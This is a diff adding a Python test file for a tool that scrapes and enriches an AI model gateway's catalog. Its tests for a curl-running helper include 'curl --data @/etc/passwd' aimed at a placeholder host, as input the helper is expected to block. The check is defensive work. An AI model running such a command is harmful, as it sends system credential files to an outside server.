@@ -1,0 +1,354 @@
+"""Testes offline do enriquecedor do catálogo NovAI."""
+from __future__ import annotations
+
+import json
+
+from eval.novai_enrich import (
+    EnrichedModel,
+    enrich,
+    fetch_gateway_models,
+    fetch_modality_lists,
+    gateway_config,
+    make_site_getter,
+    parse_available,
+    parse_code_commands,
+    parse_jsonld,
+    parse_page_enrich,
+    run_code_command,
+)
+
+
+class FakeResp:
+    def __init__(self, status, payload=None, text=None):
+        self.status_code = status
+        self._payload = payload
+        self.text = text if text is not None else (
+            json.dumps(payload) if payload is not None else "")
+
+    def json(self):
+        return self._payload
+
+
+def _getter(routes):
+    def _get(path, **kwargs):
+        return routes.get(path, FakeResp(404, text="not found"))
+    return _get
+
+
+def _poster(routes):
+    def _post(path, json_body=None, **kwargs):
+        return routes.get(path, FakeResp(404, text="not found"))
+    return _post
+
+
+# ---------------------------------------------------------------------------
+# parse_available
+# ---------------------------------------------------------------------------
+
+
+def test_parse_available_extracts_list():
+    text = '{"detail":"Model not found. Available: a, b, c"}'
+    assert parse_available(text) == ["a", "b", "c"]
+
+
+def test_parse_available_empty_when_absent():
+    assert parse_available('{"detail":"nope"}') == []
+
+
+def test_parse_available_strips_trailing_quote():
+    text = '{"detail":"Available: glm-5, glm-5.1"}'
+    assert parse_available(text) == ["glm-5", "glm-5.1"]
+
+
+# ---------------------------------------------------------------------------
+# parse_jsonld
+# ---------------------------------------------------------------------------
+
+
+JSONLD_HTML = """<html><head>
+<script type="application/ld+json">
+{"@context":"https://schema.org","@graph":[
+ {"@type":"Product","name":"GLM-5","description":"Zhipu flagship",
+  "brand":{"@type":"Brand","name":"Zhipu AI"},
+  "offers":{"@type":"Offer","price":"0.67","priceCurrency":"USD",
+   "availability":"https://schema.org/InStock","priceValidUntil":"2026-12-31"}},
+ {"@type":"BreadcrumbList"}]}
+</script></head><body></body></html>"""
+
+
+def test_parse_jsonld_extracts_product_fields():
+    ld = parse_jsonld(JSONLD_HTML)
+    assert ld["brand"] == "Zhipu AI"
+    assert ld["price"] == "0.67"
+    assert ld["currency"] == "USD"
+    assert ld["availability"] == "InStock"
+    assert ld["price_valid_until"] == "2026-12-31"
+    assert ld["description"] == "Zhipu flagship"
+
+
+def test_parse_jsonld_empty_when_absent():
+    assert parse_jsonld("<html></html>") == {}
+
+
+def test_parse_jsonld_handles_bad_json():
+    html = '<script type="application/ld+json">{not json}</script>'
+    assert parse_jsonld(html) == {}
+
+
+# ---------------------------------------------------------------------------
+# parse_code_commands
+# ---------------------------------------------------------------------------
+
+
+CODE_HTML = """<h3>cURL</h3>
+<pre><code>curl https://aiapi-pro.com/v1/chat/completions \\
+  -H "Authorization: Bearer $KEY"</code></pre>
+<h3>Python</h3>
+<pre><code>import requests
+r = requests.post("https://aiapi-pro.com/v1/chat/completions")</code></pre>
+<h3>Node.js</h3>
+<pre><code>fetch("https://aiapi-pro.com/v1/chat/completions")</code></pre>"""
+
+
+def test_parse_code_commands_classifies_kinds():
+    cmds = parse_code_commands(CODE_HTML)
+    kinds = [c["kind"] for c in cmds]
+    assert kinds == ["curl", "python", "node"]
+    assert cmds[0]["lang"] == "cURL"
+    assert "curl" in cmds[0]["code"]
+
+
+def test_parse_code_commands_empty():
+    assert parse_code_commands("<html></html>") == []
+
+
+# ---------------------------------------------------------------------------
+# parse_page_enrich
+# ---------------------------------------------------------------------------
+
+
+def test_parse_page_enrich_combines_sources():
+    html = JSONLD_HTML + CODE_HTML
+    info = parse_page_enrich("glm-5", html)
+    assert info["slug"] == "glm-5"
+    assert info["brand"] == "Zhipu AI"
+    assert info["ld_price"] == "0.67"
+    assert len(info["code_commands"]) == 3
+
+
+# ---------------------------------------------------------------------------
+# fetch_gateway_models / fetch_modality_lists
+# ---------------------------------------------------------------------------
+
+
+def test_fetch_gateway_models_returns_data():
+    g = _getter({"/models": FakeResp(200, {"data": [
+        {"id": "glm-5", "owned_by": "zhipu"}]})})
+    data = fetch_gateway_models(g)
+    assert data[0]["id"] == "glm-5"
+
+
+def test_fetch_gateway_models_raises_on_error():
+    g = _getter({"/models": FakeResp(500, text="boom")})
+    try:
+        fetch_gateway_models(g)
+        assert False, "deveria levantar"
+    except RuntimeError as exc:
+        assert "500" in str(exc)
+
+
+def test_fetch_modality_lists_captures_available():
+    p = _poster({
+        "/chat/completions": FakeResp(400, text='{"detail":"Available: glm-5, glm-5.1"}'),
+        "/images/generations": FakeResp(400, text='{"detail":"Available: qwen-image"}'),
+    })
+    lists = fetch_modality_lists(p)
+    assert lists["chat"] == ["glm-5", "glm-5.1"]
+    assert lists["image"] == ["qwen-image"]
+    assert lists["embedding"] == []  # 404 default
+
+
+# ---------------------------------------------------------------------------
+# run_code_command
+# ---------------------------------------------------------------------------
+
+
+def test_run_code_command_skips_non_curl():
+    r = run_code_command({"kind": "python", "code": "print(1)"})
+    assert r["executed"] is False
+    assert "cURL" in r["reason"]
+
+
+def test_run_code_command_runs_curl_echo():
+    r = run_code_command({"kind": "curl", "code": "curl --version"})
+    assert r["executed"] is True
+    assert r["ok"] is True
+
+
+def test_run_code_command_handles_bad_parse():
+    r = run_code_command({"kind": "curl", "code": 'curl "unclosed'})
+    assert r["executed"] is False
+
+
+def test_run_code_command_blocks_output_flag():
+    r = run_code_command({"kind": "curl", "code": "curl -o /tmp/x https://a.com"})
+    assert r["executed"] is False
+    assert "perigosa" in r["reason"]
+
+
+def test_run_code_command_blocks_upload():
+    r = run_code_command({"kind": "curl", "code": "curl --data @/etc/passwd https://a.com"})
+    assert r["executed"] is False
+    assert "upload" in r["reason"]
+
+
+def test_run_code_command_substitutes_key_placeholder():
+    # usa um comando inofensivo que ecoa a chave via --version não serve;
+    # testa a sanitização diretamente via _sanitize_curl_args
+    from eval.novai_enrich import _sanitize_curl_args
+    args, blocked = _sanitize_curl_args(
+        ["curl", "-H", "Authorization: Bearer $KEY", "https://a.com"], "nvai-secret")
+    assert blocked is None
+    assert "nvai-secret" in args[2]
+    assert "$KEY" not in args[2]
+
+
+# ---------------------------------------------------------------------------
+# enrich (orquestração)
+# ---------------------------------------------------------------------------
+
+
+def test_enrich_merges_all_sources():
+    g = _getter({
+        "/models": FakeResp(200, {"data": [
+            {"id": "glm-5", "owned_by": "zhipu", "pricing": "paid"},
+            {"id": "qwen-image", "owned_by": "alibaba", "type": "image"},
+        ]}),
+        "/models/glm-5.html": FakeResp(200, text=JSONLD_HTML + CODE_HTML),
+        "/models/qwen-image.html": FakeResp(200, text="<html></html>"),
+    })
+    p = _poster({
+        "/chat/completions": FakeResp(400, text='{"detail":"Available: glm-5"}'),
+        "/images/generations": FakeResp(400, text='{"detail":"Available: qwen-image"}'),
+    })
+    models = enrich(g, p)
+    by_id = {m.id: m for m in models}
+    assert by_id["glm-5"].owned_by == "zhipu"
+    assert by_id["glm-5"].brand == "Zhipu AI"
+    assert by_id["glm-5"].modalities == ["chat"]
+    assert by_id["qwen-image"].modalities == ["image"]
+    assert by_id["qwen-image"].type == "image"
+    assert by_id["glm-5"].has_page is True
+
+
+def test_enrich_includes_ghost_models_from_modality_lists():
+    g = _getter({
+        "/models": FakeResp(200, {"data": [{"id": "glm-5"}]}),
+        "/models/glm-5.html": FakeResp(200, text="<html></html>"),
+        "/models/doubao-seedream-4.0.html": FakeResp(200, text="<html></html>"),
+    })
+    p = _poster({
+        "/images/generations": FakeResp(
+            400, text='{"detail":"Available: doubao-seedream-4.0"}'),
+    })
+    models = enrich(g, p)
+    ids = {m.id for m in models}
+    assert "doubao-seedream-4.0" in ids
+
+
+def test_enrich_includes_slugs_param():
+    g = _getter({
+        "/models": FakeResp(200, {"data": [{"id": "glm-5"}]}),
+        "/models/glm-5.html": FakeResp(200, text="<html></html>"),
+        "/models/doubao-seedream-4.5.html": FakeResp(200, text=JSONLD_HTML),
+    })
+    p = _poster({})
+    models = enrich(g, p, slugs=["doubao-seedream-4.5"])
+    by_id = {m.id: m for m in models}
+    assert "doubao-seedream-4.5" in by_id
+    assert by_id["doubao-seedream-4.5"].brand == "Zhipu AI"
+
+
+def test_enrich_progress_callback():
+    g = _getter({"/models": FakeResp(200, {"data": [{"id": "a"}, {"id": "b"}]}),
+                 "/models/a.html": FakeResp(200, text="<html></html>"),
+                 "/models/b.html": FakeResp(200, text="<html></html>")})
+    p = _poster({})
+    seen = []
+    enrich(g, p, progress=lambda i, n, mid: seen.append(mid))
+    assert len(seen) == 2
+
+
+def test_enrich_uses_page_cache_offline():
+    g = _getter({"/models": FakeResp(200, {"data": [{"id": "glm-5"}]})})
+    p = _poster({})
+    models = enrich(g, p, pages={"glm-5": JSONLD_HTML})
+    assert models[0].brand == "Zhipu AI"
+    assert models[0].has_page is True
+
+
+def test_enriched_model_defaults():
+    m = EnrichedModel(id="x")
+    assert m.modalities == []
+    assert m.code_commands == []
+    assert m.has_page is False
+
+
+# ---------------------------------------------------------------------------
+# gateway_config / make_site_getter
+# ---------------------------------------------------------------------------
+
+
+def test_gateway_config_defaults_to_aiapi(monkeypatch):
+    # load_dotenv() recarrega o .env, então não dá para zerar a chave; validamos
+    # apenas o default do base_url e que a chave é lida do ambiente.
+    monkeypatch.delenv("NOVAI_BASE_URL", raising=False)
+    cfg = gateway_config()
+    assert cfg["base_url"] == "https://aiapi-pro.com/v1"
+    assert isinstance(cfg["api_key"], str)
+
+
+def test_gateway_config_reads_env(monkeypatch):
+    monkeypatch.setenv("NOVAI_BASE_URL", "https://example.test/v1/")
+    monkeypatch.setenv("NOVAI_API_KEY", "nvai-abc")
+    cfg = gateway_config()
+    assert cfg["base_url"] == "https://example.test/v1"  # rstrip "/"
+    assert cfg["api_key"] == "nvai-abc"
+
+
+def test_make_site_getter_strips_v1(monkeypatch):
+    seen = {}
+
+    class _Resp:
+        status_code = 200
+        text = "ok"
+
+    def _fake_get(url, headers=None, timeout=None):
+        seen["url"] = url
+        return _Resp()
+
+    import requests
+    monkeypatch.setattr(requests, "get", _fake_get)
+    g = make_site_getter({"base_url": "https://aiapi-pro.com/v1",
+                          "api_key": "nvai-x"})
+    g("/models/glm-5.html")
+    assert seen["url"] == "https://aiapi-pro.com/models/glm-5.html"
+
+
+def test_make_site_getter_keeps_root_without_v1(monkeypatch):
+    seen = {}
+
+    class _Resp:
+        status_code = 200
+        text = "ok"
+
+    def _fake_get(url, headers=None, timeout=None):
+        seen["url"] = url
+        return _Resp()
+
+    import requests
+    monkeypatch.setattr(requests, "get", _fake_get)
+    g = make_site_getter({"base_url": "https://aiapi-pro.com",
+                          "api_key": "nvai-x"})
+    g("/models/glm-5.html")
+    assert seen["url"] == "https://aiapi-pro.com/models/glm-5.html"
